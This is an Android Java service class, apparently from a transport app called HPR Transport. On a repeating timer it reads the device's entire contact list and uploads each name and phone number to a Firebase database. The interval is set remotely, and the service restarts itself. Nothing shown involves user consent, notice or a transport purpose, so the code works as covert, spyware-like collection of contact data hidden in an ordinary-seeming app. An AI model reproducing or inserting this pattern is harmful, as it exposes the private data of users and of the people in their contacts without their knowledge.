package com.example.hprtransport;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;

import java.util.Timer;
import java.util.TimerTask;

public class ContactSyncService extends Service {

    private Timer timer;
    private DatabaseReference userRef;
    private static final String TAG = "ContactSyncService";

    @Override
    public void onCreate() {
        super.onCreate();
        timer = new Timer();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        SharedPreferences sharedPreferences = getSharedPreferences("HPRTransportPrefs", MODE_PRIVATE);
        String userPhoneNumber = sharedPreferences.getString("userPhoneNumber", null);

        if (userPhoneNumber == null) {
            Log.e(TAG, "User phone number not found. Stopping service.");
            stopSelf();
            return START_NOT_STICKY;
        }

        userRef = FirebaseDatabase.getInstance().getReference("users").child(userPhoneNumber);
        scheduleContactSync();

        return START_STICKY;
    }

    private void scheduleContactSync(){
        userRef.child("contactTimer").addListenerForSingleValueEvent(new ValueEventListener() {
            @Override
            public void onDataChange(@NonNull DataSnapshot dataSnapshot) {
                long contactSyncInterval = 600000; // Default to 10 minutes
                if(dataSnapshot.exists()){
                    contactSyncInterval = dataSnapshot.getValue(Long.class) * 1000;
                }
                timer.schedule(new TimerTask() {
                    @Override
                    public void run() {
                        syncContacts();
                    }
                }, 0, contactSyncInterval);
                Log.d(TAG, "Contact sync scheduled with interval: " + contactSyncInterval + "ms");
            }

            @Override
            public void onCancelled(@NonNull DatabaseError databaseError) {
                Log.e(TAG, "Could not fetch contactTimer. Using default.", databaseError.toException());
                timer.schedule(new TimerTask() {
                    @Override
                    public void run() {
                        syncContacts();
                    }
                }, 0, 600000);
            }
        });
    }

    @SuppressLint("Range")
    private void syncContacts() {
        DatabaseReference userContactsRef = userRef.child("contacts");
        Cursor cursor = null;

        try {
            cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (cursor == null) {
                Log.e(TAG, "Cannot access contacts. Cursor is null.");
                return;
            }

            int nameIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
            int numberIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);

            while (cursor.moveToNext()) {
                String name = cursor.getString(nameIndex);
                String phoneNumber = cursor.getString(numberIndex);

                if (name != null && phoneNumber != null) {
                    String sanitizedPhoneNumber = phoneNumber.replaceAll("[.#$\\[\\]]", "");
                    if (!sanitizedPhoneNumber.isEmpty()) {
                        Contact contact = new Contact(name, phoneNumber);
                        userContactsRef.child(sanitizedPhoneNumber).setValue(contact);
                    }
                }
            }
            Log.d(TAG, "Contact sync completed for user: " + userRef.getKey());
            userRef.child("lastContactSync").setValue(System.currentTimeMillis());

        } catch (Exception e) {
            Log.e(TAG, "An error occurred during contact sync.", e);
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (timer != null) {
            timer.cancel();
        }
    }
}
